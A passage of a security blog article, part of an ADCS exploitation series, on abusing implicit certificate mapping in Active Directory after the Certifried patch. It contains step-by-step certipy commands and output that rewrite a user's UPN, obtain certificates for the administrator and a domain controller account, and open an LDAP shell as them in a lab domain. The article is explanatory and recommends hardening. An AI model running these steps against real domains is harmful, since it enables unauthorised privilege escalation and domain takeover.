+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Updating</span> <span class="n">user</span> <span class="s1">'claire'</span><span class="p">:</span>
+    <span class="n">userPrincipalName</span>                   <span class="p">:</span> <span class="n">administrator</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">updated</span> <span class="s1">'claire'</span>
+</pre></div>
+<p>Now, we’ll request a certificate using Claire’s credentials, enrolling with the built-in <code>User</code> template:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">req</span> <span class="o">-</span><span class="n">u</span> <span class="n">claire</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="mf">140e2</span><span class="n">a025b0a93dc13720d19e935a918</span> <span class="o">-</span><span class="n">template</span> <span class="n">User</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'elswixcorp-DC01-CA'</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">certificate</span> <span class="n">via</span> <span class="n">RPC</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">requested</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span> <span class="ow">is</span> <span class="mi">88</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">certificate</span> <span class="k">with</span> <span class="n">UPN</span> <span class="s1">'administrator@elswixcorp.local'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="nb">object</span> <span class="n">SID</span> <span class="ow">is</span> <span class="s1">'S-1-5-21-4266111273-315482142-3017431568-1104'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">'administrator.pfx'</span>
+</pre></div>
+<p>Perfect. We’ve successfully obtained a certificate that contains the UPN <code>administrator@elswixcorp.local</code>. Let’s now reset Claire’s UPN to its original value:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">account</span> <span class="n">update</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="n">!</span> <span class="o">-</span><span class="n">user</span> <span class="n">claire</span> <span class="o">-</span><span class="n">upn</span> <span class="n">claire</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Updating</span> <span class="n">user</span> <span class="s1">'claire'</span><span class="p">:</span>
+    <span class="n">userPrincipalName</span>                   <span class="p">:</span> <span class="n">claire</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">updated</span> <span class="s1">'claire'</span>
+</pre></div>
+<p>Next, we’ll attempt to authenticate using <strong>Kerberos PKINIT</strong>. Since the certificate includes the <code>objectSid</code> extension and <code>StrongCertificateBindingEnforcement</code> is not set to <code>0</code>, we expect this to fail:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">administrator</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">domain</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">administrator</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Object</span> <span class="n">SID</span> <span class="n">mismatch</span> <span class="n">between</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">user</span> <span class="s1">'administrator'</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Verify</span> <span class="n">that</span> <span class="n">user</span> <span class="s1">'administrator'</span> <span class="n">has</span> <span class="nb">object</span> <span class="n">SID</span> <span class="s1">'S-1-5-21-4266111273-315482142-3017431568-1104'</span>
+</pre></div>
+<p>As expected, the authentication failed.</p><br/>
+<p>Let’s now try using <strong>Schannel</strong> authentication instead of Kerberos PKINIT. This can be done by passing the <code>-ldap-shell</code> flag to <code>certipy</code> (you can also use PassTheCert):</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">administrator</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">domain</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">ldap</span><span class="o">-</span><span class="n">shell</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="s1">'ldaps://192.168.100.3:636'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Authenticated</span> <span class="n">to</span> <span class="s1">'192.168.100.3'</span> <span class="k">as</span><span class="p">:</span> <span class="n">u</span><span class="p">:</span><span class="n">ELSWIXCORP</span>\<span class="n">Administrator</span>
+<span class="n">Type</span> <span class="n">help</span> <span class="k">for</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">commands</span>
+
+<span class="c1"># whoami</span>
+<span class="n">u</span><span class="p">:</span><span class="n">ELSWIXCORP</span>\<span class="n">Administrator</span>
+
+<span class="c1">#</span>
+</pre></div>
+<p>As shown, we’ve successfully obtained an <strong>LDAP shell as <code>administrator</code></strong> via Schannel using the certificate. This was possible because <code>CertificateMappingMethods</code> is set to <code>0x4</code>.</p><br/>
+<p>When the LDAP server receives the certificate, it performs UPN-based mapping. Since the UPN in the certificate matches an existing user—in this case, the <code>administrator</code> account—the mapping succeeds. During this process, the server typically splits the UPN at the <code>@</code> symbol and attempts to match the first part (<code>administrator</code>) against the <code>sAMAccountName</code>. Once a match is found, the UPN mapping takes precedence, and the <code>objectSid</code> extension is ignored—even if it's present in the certificate.</p><br/>
+<p><strong>Note:</strong> By default, <code>certipy</code> uses LDAPS (Port 636), which might not be supported in all environments. You can override this behavior using the <code>-ldap-scheme</code> parameter to explicitly specify either <code>ldap</code> or <code>ldaps</code>.</p><br/>
+<p>Once inside the LDAP shell, you can type <code>help</code> to list the available commands:</p><br/>
+<div class="highlight"><pre><span></span><span class="c1"># help</span>
+
+ <span class="n">add_computer</span> <span class="n">computer</span> <span class="p">[</span><span class="n">password</span><span class="p">]</span> <span class="p">[</span><span class="n">nospns</span><span class="p">]</span> <span class="o">-</span> <span class="n">Adds</span> <span class="n">a</span> <span class="n">new</span> <span class="n">computer</span> <span class="n">to</span> <span class="n">the</span> <span class="n">domain</span> <span class="k">with</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">password</span><span class="o">.</span> <span class="n">If</span> <span class="n">nospns</span> <span class="ow">is</span> <span class="n">specified</span><span class="p">,</span> <span class="n">computer</span> <span class="n">will</span> <span class="n">be</span> <span class="n">created</span> <span class="k">with</span> <span class="n">only</span> <span class="n">a</span> <span class="n">single</span> <span class="n">necessary</span> <span class="n">HOST</span> <span class="n">SPN</span><span class="o">.</span> <span class="n">Requires</span> <span class="n">LDAPS</span><span class="o">.</span>
+ <span class="n">rename_computer</span> <span class="n">current_name</span> <span class="n">new_name</span> <span class="o">-</span> <span class="n">Sets</span> <span class="n">the</span> <span class="n">SAMAccountName</span> <span class="n">attribute</span> <span class="n">on</span> <span class="n">a</span> <span class="n">computer</span> <span class="nb">object</span> <span class="n">to</span> <span class="n">a</span> <span class="n">new</span> <span class="n">value</span><span class="o">.</span>
+ <span class="n">add_user</span> <span class="n">new_user</span> <span class="p">[</span><span class="n">parent</span><span class="p">]</span> <span class="o">-</span> <span class="n">Creates</span> <span class="n">a</span> <span class="n">new</span> <span class="n">user</span><span class="o">.</span>
+ <span class="n">add_user_to_group</span> <span class="n">user</span> <span class="n">group</span> <span class="o">-</span> <span class="n">Adds</span> <span class="n">a</span> <span class="n">user</span> <span class="n">to</span> <span class="n">a</span> <span class="n">group</span><span class="o">.</span>
+ <span class="n">change_password</span> <span class="n">user</span> <span class="p">[</span><span class="n">password</span><span class="p">]</span> <span class="o">-</span> <span class="n">Attempt</span> <span class="n">to</span> <span class="n">change</span> <span class="n">a</span> <span class="n">given</span> <span class="n">user</span><span class="s1">'s password. Requires LDAPS.</span>
+ <span class="n">clear_rbcd</span> <span class="n">target</span> <span class="o">-</span> <span class="n">Clear</span> <span class="n">the</span> <span class="n">resource</span> <span class="n">based</span> <span class="n">constrained</span> <span class="n">delegation</span> <span class="n">configuration</span> <span class="n">information</span><span class="o">.</span>
+ <span class="n">disable_account</span> <span class="n">user</span> <span class="o">-</span> <span class="n">Disable</span> <span class="n">the</span> <span class="n">user</span><span class="s1">'s account.</span>
+ <span class="n">enable_account</span> <span class="n">user</span> <span class="o">-</span> <span class="n">Enable</span> <span class="n">the</span> <span class="n">user</span><span class="s1">'s account.</span>
+ <span class="n">dump</span> <span class="o">-</span> <span class="n">Dumps</span> <span class="n">the</span> <span class="n">domain</span><span class="o">.</span>
+ <span class="n">search</span> <span class="n">query</span> <span class="p">[</span><span class="n">attributes</span><span class="p">,]</span> <span class="o">-</span> <span class="n">Search</span> <span class="n">users</span> <span class="ow">and</span> <span class="n">groups</span> <span class="n">by</span> <span class="n">name</span><span class="p">,</span> <span class="n">distinguishedName</span> <span class="ow">and</span> <span class="n">sAMAccountName</span><span class="o">.</span>
+ <span class="n">get_user_groups</span> <span class="n">user</span> <span class="o">-</span> <span class="n">Retrieves</span> <span class="nb">all</span> <span class="n">groups</span> <span class="n">this</span> <span class="n">user</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">member</span> <span class="n">of</span><span class="o">.</span>
+ <span class="n">get_group_users</span> <span class="n">group</span> <span class="o">-</span> <span class="n">Retrieves</span> <span class="nb">all</span> <span class="n">members</span> <span class="n">of</span> <span class="n">a</span> <span class="n">group</span><span class="o">.</span>
+ <span class="n">get_laps_password</span> <span class="n">computer</span> <span class="o">-</span> <span class="n">Retrieves</span> <span class="n">the</span> <span class="n">LAPS</span> <span class="n">passwords</span> <span class="n">associated</span> <span class="k">with</span> <span class="n">a</span> <span class="n">given</span> <span class="n">computer</span> <span class="p">(</span><span class="n">sAMAccountName</span><span class="p">)</span><span class="o">.</span>
+ <span class="n">grant_control</span> <span class="n">target</span> <span class="n">grantee</span> <span class="o">-</span> <span class="n">Grant</span> <span class="n">full</span> <span class="n">control</span> <span class="n">of</span> <span class="n">a</span> <span class="n">given</span> <span class="n">target</span> <span class="nb">object</span> <span class="p">(</span><span class="n">sAMAccountName</span><span class="p">)</span> <span class="n">to</span> <span class="n">the</span> <span class="n">grantee</span> <span class="p">(</span><span class="n">sAMAccountName</span><span class="p">)</span><span class="o">.</span>
+ <span class="n">set_dontreqpreauth</span> <span class="n">user</span> <span class="n">true</span><span class="o">/</span><span class="n">false</span> <span class="o">-</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">don</span><span class="s1">'t require pre-authentication flag to true or false.</span>
+ <span class="n">set_rbcd</span> <span class="n">target</span> <span class="n">grantee</span> <span class="o">-</span> <span class="n">Grant</span> <span class="n">the</span> <span class="n">grantee</span> <span class="p">(</span><span class="n">sAMAccountName</span><span class="p">)</span> <span class="n">the</span> <span class="n">ability</span> <span class="n">to</span> <span class="n">perform</span> <span class="n">RBCD</span> <span class="n">to</span> <span class="n">the</span> <span class="n">target</span> <span class="p">(</span><span class="n">sAMAccountName</span><span class="p">)</span><span class="o">.</span>
+ <span class="n">start_tls</span> <span class="o">-</span> <span class="n">Send</span> <span class="n">a</span> <span class="n">StartTLS</span> <span class="n">command</span> <span class="n">to</span> <span class="n">upgrade</span> <span class="kn">from</span><span class="w"> </span><span class="nn">LDAP</span> <span class="n">to</span> <span class="n">LDAPS</span><span class="o">.</span> <span class="n">Use</span> <span class="n">this</span> <span class="n">to</span> <span class="n">bypass</span> <span class="n">channel</span> <span class="n">binding</span> <span class="k">for</span> <span class="n">operations</span> <span class="n">necessitating</span> <span class="n">an</span> <span class="n">encrypted</span> <span class="n">channel</span><span class="o">.</span>
+ <span class="n">write_gpo_dacl</span> <span class="n">user</span> <span class="n">gpoSID</span> <span class="o">-</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">full</span> <span class="n">control</span> <span class="n">ACE</span> <span class="n">to</span> <span class="n">the</span> <span class="n">gpo</span> <span class="k">for</span> <span class="n">the</span> <span class="n">given</span> <span class="n">user</span><span class="o">.</span> <span class="n">The</span> <span class="n">gpoSID</span> <span class="n">must</span> <span class="n">be</span> <span class="n">entered</span> <span class="n">surrounding</span> <span class="n">by</span> <span class="p">{}</span><span class="o">.</span>
+ <span class="n">whoami</span> <span class="o">-</span> <span class="n">get</span> <span class="n">connected</span> <span class="n">user</span>
+ <span class="n">dirsync</span> <span class="o">-</span> <span class="n">Dirsync</span> <span class="n">requested</span> <span class="n">attributes</span>
+ <span class="n">exit</span> <span class="o">-</span> <span class="n">Terminates</span> <span class="n">this</span> <span class="n">session</span><span class="o">.</span>
+
+<span class="c1">#</span>
+</pre></div>
+<p>As demonstrated, the LDAP shell provides a wide range of capabilities for enumeration and privilege escalation within the domain. From this point, there are several paths you can take to gain full control over the Domain Controller.</p><br/>
+<h3>Alternative Approach for Case 2</h3><br/>
+<p>It's also possible to impersonate a Domain Controller account. In this case, instead of changing the UPN to match <code>administrator</code>, you can set it to something like <code>dc01$</code> (the machine account of a DC), allowing you to perform actions as that DC if the mapping succeeds.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">account</span> <span class="n">update</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="n">!</span> <span class="o">-</span><span class="n">user</span> <span class="n">claire</span> <span class="o">-</span><span class="n">upn</span> <span class="s1">'dc01$@elswixcorp.local'</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Updating</span> <span class="n">user</span> <span class="s1">'claire'</span><span class="p">:</span>
+    <span class="n">userPrincipalName</span>                   <span class="p">:</span> <span class="n">dc01</span><span class="n">$</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">updated</span> <span class="s1">'claire'</span>
+</pre></div>
+<p>Now, let’s request a certificate using Claire’s credentials:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">req</span> <span class="o">-</span><span class="n">u</span> <span class="n">claire</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="mf">140e2</span><span class="n">a025b0a93dc13720d19e935a918</span> <span class="o">-</span><span class="n">template</span> <span class="n">User</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'elswixcorp-DC01-CA'</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">certificate</span> <span class="n">via</span> <span class="n">RPC</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">requested</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span> <span class="ow">is</span> <span class="mi">91</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">certificate</span> <span class="k">with</span> <span class="n">UPN</span> <span class="s1">'dc01$@elswixcorp.local'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="nb">object</span> <span class="n">SID</span> <span class="ow">is</span> <span class="s1">'S-1-5-21-4266111273-315482142-3017431568-1104'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">'dc01.pfx'</span>
+</pre></div>
+<p>Perfect. Now, let’s reset Claire’s UPN:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">account</span> <span class="n">update</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="n">!</span> <span class="o">-</span><span class="n">user</span> <span class="n">claire</span> <span class="o">-</span><span class="n">upn</span> <span class="s1">'claire@elswixcorp.local'</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Updating</span> <span class="n">user</span> <span class="s1">'claire'</span><span class="p">:</span>
+    <span class="n">userPrincipalName</span>                   <span class="p">:</span> <span class="n">claire</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">updated</span> <span class="s1">'claire'</span>
+</pre></div>
+<p>Finally, let’s use the certificate for authentication:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">dc01</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">domain</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">ldap</span><span class="o">-</span><span class="n">shell</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="s1">'ldaps://192.168.100.3:636'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Authenticated</span> <span class="n">to</span> <span class="s1">'192.168.100.3'</span> <span class="k">as</span><span class="p">:</span> <span class="n">u</span><span class="p">:</span><span class="n">ELSWIXCORP</span>\<span class="n">DC01</span><span class="n">$</span>
+<span class="n">Type</span> <span class="n">help</span> <span class="k">for</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">commands</span>
+
+<span class="c1"># whoami</span>
+<span class="n">u</span><span class="p">:</span><span class="n">ELSWIXCORP</span>\<span class="n">DC01</span><span class="n">$</span>
+
+<span class="c1">#</span>
+</pre></div>
+<p>Great! As shown, we successfully authenticated as <code>dc01$</code> via Schannel. Basically, the DC extracted the UPN from the certificate’s SAN, searched for the full UPN account, but didn’t find any match (since there’s no account with the UPN <code>dc01$@elswixcorp.local</code>). Then, it split the UPN at the <code>@</code> symbol, took only the username part (<code>dc01$</code>), and looked for a <code>sAMAccountName</code> matching that value, successfully identifying the DC account.</p><br/>
+<p>From here, you could configure <strong>Resource-Based Constrained Delegation (RBCD)</strong> to fully compromise the domain.</p><br/>
+<p>This approach also works using the <code>dNSHostName</code> attribute when you have write permissions over a <strong>computer account</strong>, similar to the original Certifried technique, but this time leveraging <strong>Schannel</strong> instead of Kerberos. In that case, you would use the built-in <code>Machine</code> template instead of <code>User</code>.</p><br/>
+<h3>Conclusion</h3><br/>
+<p>As we've seen throughout this article, even after the Certifried patch, misconfigurations in certificate template flags and registry settings like <code>StrongCertificateBindingEnforcement</code> and <code>CertificateMappingMethods</code> can still leave Active Directory environments vulnerable to certificate-based privilege escalation. By abusing weak mapping logic, especially through Schannel and UPN-based mappings, an attacker with minimal rights, such as <code>GenericWrite</code>, can impersonate high-privileged users or even domain controllers. This highlights the importance of not only applying patches but also properly hardening ADCS configurations to prevent legacy behaviors from reintroducing old attack paths.</p><br/>
+<p>In this article, we explored <strong>Implicit Certificate Mapping</strong> and how it can still be exploited despite the Certifried patch, depending on registry settings and template configurations. In <strong>Part 3</strong>, we’ll dive into <strong>Explicit Certificate Mapping</strong> and how insecure configurations or excessive privileges can lead to <code>ESC14</code>. We’ll also cover <code>ESC15</code>, which is more straightforward but unrelated to certificate mapping exploitation.</p><br/>
+<h3>References</h3><br/>
+<p><a href="https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760">https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760</a>
+<br/>
+<a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4</a>
+<br/>
+<a href="https://www.thehacker.recipes/ad/movement/adcs/certificate-templates">https://www.thehacker.recipes/ad/movement/adcs/certificate-templates</a>
+<br/>
+<a href="https://www.thehacker.recipes/ad/movement/adcs/certificate-authority">https://www.thehacker.recipes/ad/movement/adcs/certificate-authority</a>
+<br/>
+<a href="https://www.thehacker.recipes/ad/movement/adcs/certifried">https://www.thehacker.recipes/ad/movement/adcs/certifried</a>
+<br/></p><br/>
+                        </div>
+                    </div>
+                </section>
+
+            </main>
+        </div>
+    </div>
+    <script src="/js/sidebarToggle.js"></script>
+    <script src="/js/fixMobileImages.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
